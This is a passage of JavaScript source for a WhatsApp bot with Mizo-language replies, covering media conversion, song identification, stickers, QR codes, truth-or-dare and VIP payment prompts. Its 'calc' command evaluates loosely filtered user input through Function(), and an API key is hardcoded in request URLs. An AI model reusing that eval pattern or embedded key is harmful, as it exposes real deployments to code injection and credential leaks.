    await eco.deduct(limitneihtu, freevip, 1);
    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
    
    await finishreact();
}
break;
case 'addvn':{
if (!HerbertTheCreator && !HerbertTheCreator1) return dodoi(mess.owner)
if (args.length < 1) return dodoi('Audio hming rawn dah rawh')
if (VoiceNoteHerbert.includes(q)) return dodoi("a hming a awm tawh!..")
let delb = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
VoiceNoteHerbert.push(q)
await fsx.copy(delb, `./asset/audio/${q}.mp3`)
fs.writeFileSync('./asset/database/herbertvn.json', JSON.stringify(VoiceNoteHerbert))
fs.unlinkSync(delb)
dodoi(`Audio ah dah a ni e\nTiang hian type la i en thei ang ${prefix}listvn`)
}
break
case 'delvn':{
if (!HerbertTheCreator && !HerbertTheCreator1) return dodoi(mess.owner)
if (args.length < 1) return dodoi('i delete duh vn hming rawn dah rawh')
if (!VoiceNoteHerbert.includes(q)) return dodoi("Database ah chu tiang hming chu a awm lo")
let wanu = VoiceNoteHerbert.indexOf(q)
VoiceNoteHerbert.splice(wanu, 1)
fs.writeFileSync('./asset/database/herbertvn.json', JSON.stringify(VoiceNoteHerbert))
fs.unlinkSync(`./asset/audio/${q}.mp3`)
dodoi(`Delete a ni tawh e ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n┃\n'
for (let x of VoiceNoteHerbert) {
teks += `┃⭔ ${x}\n`
}
teks += `┃\n└────────────⭓\n\n*A vaiin : ${VoiceNoteHerbert.length}*`
dodoi(teks)
}
break 
case 'left': {

if (!HerbertTheCreator && !HerbertTheCreator1) return
if (text == 'rawh') {
await dodoi ('Awle boss 🫡')
await HBWABotMz.groupLeave(m.chat)
}
}
break

case 'grp': {

if (!m.isGroup) return
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
if (!isAdmins && !HerbertTheCreator) return dodoi(mess.admin)
if (!isBotAdmins) return dodoi(mess.BotAdmin)
if (!q) return dodoi(`Group info i edit duh chuan option ang khuan ti ang che\n\n*Options : close & open*\nclose chu admin te chauh tawng theia dah na\nopen chu partisipants te tawng ve theia dahna \nEntirnan tiang hian i ti ang : ${command} close`)
if (args[0] == 'close') {
HBWABotMz.groupSettingUpdate(from, 'announcement')
dodoi(`He group hi Admin te chauh message thawn thei tura dah a ni e...✓`)
} else if (args[0] == 'open') {
HBWABotMz.groupSettingUpdate(from, 'not_announcement')
dodoi(`He group hi participants zawng zawngten message thawn thei tawh tura dah a ni e....✓`)
await eco.deduct(limitneihtu, kancoins, hmanzat) 
}
else {
dodoi(`Option te khu hmang rawh\nOptions : Close & Open\nTiang hian : ${command} close`)
}}
break

case 'toaud': case 'toaudio': {

if (!/video/.test(mime) && !/audio/.test(mime)) return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, audio type in ka rawn thawn ang che.... `)
if (!quoted) return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, audio type in ka rawn thawn ang che.... `)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
HBWABotMz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await finishreact()
}
break
case 'shazam': {

let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || '';
if (!/video/.test(mime) && !/audio/.test(mime)) { return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, a hla/music hming ka rawn zawn sak ang che....`)
    }
if ((q.msg || q).seconds > 45) { return dodoi('Khawngihin, second 45 aia tam rawn thawn suh ka access thei lo')
    }
if (!q) { return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, a hla/music hming ka rawn zawn sak ang che....`)
    }
const limit1= await eco.balance(limitneihtu, kancoins)
if (60 > limit1.wallet) return dodoi(`He featurs hi hman i duh chuan 🪙60 i neih a ngai!!.\n\nBot rawn hmang thar tur i nih chuan coins tiin type rawh, ti chuan bot hman theihna tur 🪙500 i dawng ang, emaw i thiante in thawn tir rawh`)
    HBWABotMz.sendMessage(from, { react: { text: "🔍", key: m.key }})
let media = await q.download()
let ext = mime.split('/')[1];
    fs.writeFileSync(`./asset/trash/${m.sender}.${ext}`, media)
let res = await acr.identify(fs.readFileSync(`./asset/trash/${m.sender}.${ext}`))
let { code, msg } = res.status;
if (code !== 0) { return dodoi(`I music duh ang hi ka hmu thei lo, i hla rawn thawn hi original ni lo a ni mai thei.. emaw ka Api's laknaah dik lo a awm a ni thei`)
    }
var zamzam = await getBuffer(`https://i.imgur.com/hYFjOKu.png`)
let { title, artists, album, genres, release_date } = res.metadata.music[0];
const sazu = `${title} ${artists !== undefined ? artists.map(v => v.name).join(', ') : ''}`;
let ytu = await yts(sazu)
let vid = ytu.videos[0]
let v = vid.url
HBWABotMz.sendMessage(m.chat, { text: `
*RESULTS*
╭═══════════┈
┃𒆜┌───┈
┃𒆜│📌 *TITLE:* ${title || 'Ka hmu thei lo'}
┃𒆜│👨‍🎤 *ARTIST:* ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'Ka hmu thei lo'}
┃𒆜│💾 *ALBUM:* ${album && album.name ? album.name : 'Ka hmu thei lo'}
┃𒆜│🌐 *GENRE:* ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'Ka hmu thei lo'}
┃𒆜│📆 *RELEASE DATE:* ${release_date || 'Ka hmu thei lo'}
┃𒆜└───────────┈ 
╰════════════──┈ `, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `SHAZAM`,"body": `${title || 'Ka hmu thei lo'}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./asset/image/ShaZam.png`),"sourceUrl": `${v}`}}}, { quoted: m})
await eco.deduct(limitneihtu, kancoins, 60)
await eco.give(limitneihtu, kantitle, hmanzat2)
    await finishreact()
    fs.unlinkSync(`./asset/trash/${m.sender}.${ext}`)
    break;
}

case 'shazam2': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
let q = m.quoted ? m.quoted : m;
if (!q) {return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, a hla/music hming ka rawn zawn sak ang che....`)
  }
let mime = (q.msg || q).mimetype || '';
if (!/video/.test(mime) && !/audio/.test(mime)) { return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, a hla/music hming ka rawn zawn sak ang che....`)
  }
  const limit1 = await eco.balance(limitneihtu, kancoins)
if (100 > limit1.wallet) { return dodoi('He featurs hi hman i duh chuan 🪙100 i neih a ngai!!.\n\nBot rawn hmang thar tur i nih chuan coins tiin type rawh, ti chuan bot hman theihna tur 🪙500 i dawng ang, emaw i thiante in thawn tir rawh')
  }
var zamzam = await getBuffer(`https://i.imgur.com/hYFjOKu.png`)
  await loadingreact()
let media = await q.download()
let ext = mime.split('/')[1];
    fs.writeFileSync(`./asset/trash/${m.sender}.${ext}`, media)
try {
let res = await acr.identify(fs.readFileSync(`./asset/trash/${m.sender}.${ext}`))
let { code, msg } = res.status;
if (code !== 0) { return dodoi(`I music duh ang hi ka hmu thei lo, i hla rawn thawn hi original ni lo a ni mai thei, emaw ka Api's lakna ah dik lo a awm a ni thei`)
    }
let { title, artists, album, genres, release_date } = res.metadata.music[0];
const sazu = `${title} ${artists !== undefined ? artists.map(v => v.name).join(', ') : ''}`;
 let res2 = await yts(sazu)
  const vid = res2.videos[0];
  const url = vid.url
  let result;
    try {
        result = await SaveTube(url, "mp3");
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(url, "mp3");
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Audio laknaah error a awm:  ${amdlError.message}`);
        }
    }
    const {download } = result.result;
  await uploadreact()
await HBWABotMz.sendMessage(m.chat, { audio: { url: download}, mimetype: 'audio/mpeg', 
contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `${title || 'Ka hmu thei lo'}`,"body": `${artists !== undefined ? artists.map(v => v.name).join(', ') : 'Ka hmu thei lo'}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./asset/image/ShaZam.png`),"sourceUrl": `${url}`}}}, { quoted: m })
    await uploadreact()
    await eco.deduct(limitneihtu, kancoins, 100)
    await eco.give(limitneihtu, kantitle, hmanzat2)
    await eco.deduct(limitneihtu, freevip, 1);
    await finishreact()
    fs.unlinkSync(`./asset/trash/${m.sender}.${ext}`)
  } catch (error) {
    console.error('Error:', error)
  }
  break;
}
case 'shazam3': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
let q = m.quoted ? m.quoted : m;
if (!q) {return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, a hla/music hming ka rawn zawn sak ang che....`)
  }
let mime = (q.msg || q).mimetype || '';
if (!/video/.test(mime) && !/audio/.test(mime)) { return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, a hla/music hming ka rawn zawn sak ang che....`)
  }
const limit1 = await eco.balance(limitneihtu, kancoins)
if (100 > limit1.wallet) { return dodoi('He featurs hi hman i duh chuan 🪙100 i neih a ngai!!.\n\nBot rawn hmang thar tur i nih chuan coins tiin type rawh, ti chuan bot hman theihna tur 🪙500 i dawng ang, emaw i thiante in thawn tir rawh')
  }
var zamzam = await getBuffer(`https://i.imgur.com/hYFjOKu.png`)
  await loadingreact()
let media = await q.download()
let ext = mime.split('/')[1];
    fs.writeFileSync(`./asset/trash/${m.sender}.${ext}`, media)
try {
let res = await acr.identify(fs.readFileSync(`./asset/trash/${m.sender}.${ext}`))
let { code, msg } = res.status;
if (code !== 0) { return dodoi(`I music duh ang hi ka hmu thei lo, i hla rawn thawn hi original ni lo a ni mai thei, emaw ka Api's ah hian dik lo a awm pawh a ni thei`)
    }
let { title, artists, album, genres, release_date } = res.metadata.music[0];
const sazu = `${title} ${artists !== undefined ? artists.map(v => v.name).join(', ') : ''}`;
let res2 = await yts(sazu)
  const vid = res2.videos[0];
  const q = '360p';
  const url = vid.url
  let result;
    try {
        result = await SaveTube(url, "mp3");
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(url, "mp3");
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Audio laknaah error a awm:  ${amdlError.message}`);
        }
    }
    const { download } = result.result;
  await uploadreact()
await HBWABotMz.sendMessage(m.chat,{document: { url: download },
    caption: `╭═══════════┈
┃𒆜┌───┈
┃𒆜│📌 *TITLE:* ${title || 'Ka hmu thei lo'}
┃𒆜│👨‍🎤 *ARTIST:* ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'Ka hmu thei lo'}
┃𒆜│💾 *ALBUM:* ${album && album.name ? album.name : 'Ka hmu thei lo'}
┃𒆜│🌐 *GENRE:* ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'Ka hmu thei lo'}
┃𒆜│📆 *RELEASE DATE:* ${release_date || 'Ka hmu thei lo'}
┃𒆜└───────────┈ 
╰════════════──┈`,
fileName: `${title}.mp3`,
mimetype: 'audio/mp4',
contextInfo:{
 externalAdReply:{
 title: title || 'Ka hmu thei lo',
 body: artists !== undefined ? artists.map(v => v.name).join(', ') : 'Ka hmu thei lo',
 thumbnail: fs.readFileSync(`./asset/image/ShaZam.png`),
 mediaType:1,
 mediaUrl:vid.url,
  }
},
},{quoted:m})
await fs.unlinkSync(pl.path)
    await uploadreact()
    await eco.deduct(limitneihtu, kancoins, 100)
    await eco.give(limitneihtu, kantitle, hmanzat2)
    await eco.deduct(limitneihtu, freevip, 1);
    await finishreact()
    fs.unlinkSync(`./asset/trash/${m.sender}.${ext}`)
  } catch (error) {
    console.error('Error:', error)
  }
  break;
}
case 'tomp3': {

if (/document/.test(mime)) return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, Mp3 document file in ka rawn thawn ang che.... `)
if (!/video/.test(mime) && !/audio/.test(mime)) return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, Mp3 document file in ka rawn thawn ang che.... `)
if (!quoted) return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, Mp3 document file in ka rawn thawn ang che.... `)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
HBWABotMz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${HBWABotMz.user.name}.mp3`}, { quoted : m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await finishreact()
}
break
case 'tovn': case 'toptt': {

if (!/video/.test(mime) && !/audio/.test(mime)) return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `)
if (!quoted) return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
HBWABotMz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await finishreact()
}
break

case 'togif': {

if (!quoted) return dodoi('Animated sticker reply rawh')
if (!/webp/.test(mime)) return dodoi(`Animated sticker reply rawh tiang hian: *${prefix + command}*`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
    let link = await tourlup(media);
    const nunui2 = await fetchJson(`https://api.betabotz.eu.org/api/tools/webp2mp4?url=${link}&apikey=Btz-HlFgj`)
   const herbert2 = nunui2.result;
   let media2 = await getBuffer(`${herbert2}`)
await HBWABotMz.sendMessage(m.chat, { video: media2 , caption: 'Convert Webp To GIF', gifPlayback: true }, { quoted: m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await finishreact()
}
break

case  'tomp4': {
if (!quoted) return dodoi('Animated sticker reply rawh')
if (!/webp/.test(mime)) return dodoi(`Animated sticker reply rawh tiang hian: *${prefix + command}*`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
    let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
    let link = await tourlup(media);
    const nunui2 = await fetchJson(`https://api.betabotz.eu.org/api/tools/webp2mp4?url=${link}&apikey=Btz-HlFgj`)
   const herbert2 = nunui2.result;
   let media2 = await getBuffer(`${herbert2}`)
await HBWABotMz.sendMessage(m.chat, { video: {url : herbert2 }, caption: 'Convert Webp To Video' }, { quoted: m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await finishreact()
}
break

 case 'tourl': case 'tolink': {
  if (!quoted) return dodoi(`Media a caption-ah *${prefix + command}* tih rawn dah rawh`);
  const limit1 = await eco.balance(limitneihtu, kancoins);
  if (hmanzat > limit1.wallet) return await dailylimit();
  await loadingreact()
  let { key } = await HBWABotMz.sendMessage(from, { text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._' }, { quoted: m });
  let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted);
  let link = await tourlup(media);
  await uploadreact()
  let hmantur = `${link}`;
  let HBLoadingmenu = [
      `《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
      `《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
      `《████▒▒▒▒▒▒▒▒》30%`,
      `《███████▒▒▒▒▒》50%`,
      `《██████████▒▒》80%`,
      `《████████████》100%`,
      `Hei le\n${hmantur}`
  ];
  for (let i = 0; i < HBLoadingmenu.length; i++) {
      await new Promise(resolve => setTimeout(resolve, 1000));
      await HBWABotMz.sendMessage(from, { text: HBLoadingmenu[i], edit: key }, { quoted: m });
  }
  await eco.deduct(limitneihtu, kancoins, hmanzat);
  await eco.give(limitneihtu, kantitle, hmanzat2);
  await finishreact()
  if (fs.existsSync(media)) {
      fs.unlinkSync(media);
  }
        }
        break;
        
 case 'calc': {
    if (!q) return dodoi('Calculate tur rawn dah rawh\nEntirnan : 4×10');
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    try {
        let expression = q
            .replace(/×/g, '*')  // Convert × to *
            .replace(/÷/g, '/')  // Convert ÷ to /
            .replace(/%/g, '/100') // Convert percentage (50% → 50/100)
            .replace(/\^/g, '**') // Convert exponentiation (2^3 → 2**3)
            .replace(/[^0-9+\-*/().%^a-zA-Z ]/g, '');
        if (!expression.match(/^[0-9+\-*/().%^a-zA-Z ]+$/)) {
            return await HBWABotMz.sendMessage(from, { 
    text: `A format a dik lo, a hnuaia option ang hian hman tur a ni*\n- *${prefix + command} 5×3* (Multiplication)\n- *${prefix + command} 10÷2* (Division)\n- *${prefix + command} 2^3* (Exponentiation)\n- *${prefix + command} sqrt(25)* (Square root)\n- *${prefix + command} sin(30)* (Trigonometry in degrees)\n\n🔄 *Format dik tak hmangin i try leh thei ang!*`, 
}, { quoted: m });
        }
        // Allowed math functions (Trigonometry in degrees)
        const safeMath = {
            sin: (x) => Math.sin((x * Math.PI) / 180), // Convert degrees to radians
            cos: (x) => Math.cos((x * Math.PI) / 180),
            tan: (x) => Math.tan((x * Math.PI) / 180),
            cosec: (x) => 1 / Math.sin((x * Math.PI) / 180), // Cosecant
            sec: (x) => 1 / Math.cos((x * Math.PI) / 180), // Secant
            cot: (x) => 1 / Math.tan((x * Math.PI) / 180), // Cotangent
            log: (x) => Math.log10(x),
            ln: (x) => Math.log(x),
            sqrt: (x) => Math.sqrt(x),
            pow: (x, y) => Math.pow(x, y),
            abs: (x) => Math.abs(x),
            pi: Math.PI,
            e: Math.E,
        };
        let result = Function('"use strict"; return (' + expression + ')').call(safeMath);
        if (!isFinite(result)) dodoi('Chhut chhuak thei lo');
        let response = `\n*Calculation:* ${q} = ${result.toFixed(4)}\n\n*©${global.botname}*`;
        await HBWABotMz.sendMessage(from, { text: response }, { quoted: m });
    } catch (error) {
        await HBWABotMz.sendMessage(from, { text: 'A format a dik lo.. ' }, { quoted: m });
    }
    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
}
break;
        
        
case 'toqr':{
if (!q) return dodoi('Text emaw link rawn dah tel rawh\n*Entirnan:* toqr https://www.youtube.com/@HBMods_Channel')
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
 const QrCode = require('qrcode-reader')
 const qrcode = require('qrcode')
 let qyuer = await qrcode.toDataURL(q, { scale: 35 })
 let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
 let buff = getRandom('.jpg')
 await fs.writeFileSync('./'+buff, data)
 let medi = fs.readFileSync('./' + buff)
await HBWABotMz.sendMessage(from, { image: medi, caption:`\n*©${global.botname}*`}, { quoted: m })
 setTimeout(() => { fs.unlinkSync(buff) }, 10000)
 await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break
case 'dare': {
 
if (!m.isGroup) return dodoi(mess.group)
var truthordare = await getBuffer(`https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/Media/truthordare.jpg`)
const dare = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/dare.json')
const herbertdare = dare[Math.floor(Math.random() * dare.length)]
HBWABotMz.sendMessage(from, { 
text: ` *DARE I THLANGA*\n${herbertdare}\n\n____________`,
contextInfo:{
externalAdReply:{ 
showAdAttribution: true,
containsAutoReply: true,
title: 'Truth or Dare',
body: 'Fun Game',
thumbnail: truthordare,
mediaType: 1,
mediaUrl: `https://www.youtube.com/@HBMods_Channel`,
sourceUrl: `https://www.youtube.com/@HBMods_Channel`
}
}
},{quoted:m})
}
break

case 'truth': {
 
if (!m.isGroup) return dodoi(mess.group)
var truthordare = await getBuffer(`https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/Media/truthordare.jpg`)
const truth = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/truth.json')
const herberttruth = truth[Math.floor(Math.random() * truth.length)]
HBWABotMz.sendMessage(from, { 
text: ` *TRUTH I THLANGA*\n${herberttruth}\n\n____________`,
contextInfo:{
externalAdReply:{ 
showAdAttribution: true,
containsAutoReply: true,
title: 'Truth or Dare',
body: 'Fun Game',
thumbnail: truthordare,
mediaType: 1,
mediaUrl: `https://www.youtube.com/@HBMods_Channel`,
sourceUrl: `https://www.youtube.com/@HBMods_Channel`
}
}
},{quoted:m})
}
break
case 'toimg': case 'thlalakk': {

await loadingreact()
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
}
if (!m.quoted) return dodoi(`Tuna i type ang chiah hian sticker reply la, ti chuan photo-in ka rawn thawn ang che`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
let media = await HBWABotMz.downloadAndSaveMediaMessage(m.quoted)
let ran = await getRandom('.png')
      exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
HBWABotMz.sendMessage(m.chat, {
    image: buffer
}, {
    quoted: m
})
fs.unlinkSync(ran)
      })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await loadingreact()
} else return dodoi(`Sticker che thei lo ang chi chauh rawn reply rawh`)
}
break 
case 'swm': case 'steal': case 'stickerwm': case 'take':{
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!args.join(" ")) return dodoi(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await HBWABotMz.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return dodoi('Second 10 aia tam a thei loh!')
let media = await quoted.download()
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);let encmedia = await HBWABotMz.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
}
else {
dodoi(`Sticker reply ta che🤦`)
}
}
break
case 'qc': case 'text': {
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!args[0] && !m.quoted) {
return dodoi(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
}
let userPfp
if (m.quoted) {
try {
userPfp = await HBWABotMz.profilePictureUrl(m.quoted.sender, "image")
} catch (e) {
userPfp = defaultpp
}
} else {
try {
userPfp = await HBWABotMz.profilePictureUrl(m.sender, "image")
} catch (e) {
userPfp = defaultpp
}
}
const waUserName = pushname
const quoteText = m.quoted ? m.quoted.body : args.join(" ")
const quoteJson = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: waUserName,
photo: {
url: userPfp,
},
},
text: quoteText,
replyMessage: {},
},
],
}
try {
const quoteResponse = await axios.post("https://btzqc.betabotz.eu.org/generate", quoteJson, {
headers: { "Content-Type": "application/json" },
})
const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
HBWABotMz.sendImageAsSticker(m.chat, buffer, m, {
packname: packname,
author: author,
})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);
await finishreact()
} catch (error) {
console.error(error)
dodoi('Error')
}
}
break

case 'myid': {
await HBWABotMz.sendMessage(from, { text: `
  {
    "name": "${pushname}",
    "id": "${m.sender}",
    "expired": "random"
  },`}, { quoted: m })
}
break
case 'myid1': {
  const kumtinvip = moment.tz('Asia/Kolkata').format('YYYY-MM-DD');
  const kumtinvip2 = moment(kumtinvip).add(10, 'days').format('YYYY-MM-DD');
  const caption1 = `Hello sir, He user(${sender.split('@')[0]}) hian ${kumtinvip2} hun chhung vip Fee a rawn pek huna i approved turin ka rawn thawn e`
  if (!isVip) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
  HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
}
if (isExp) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
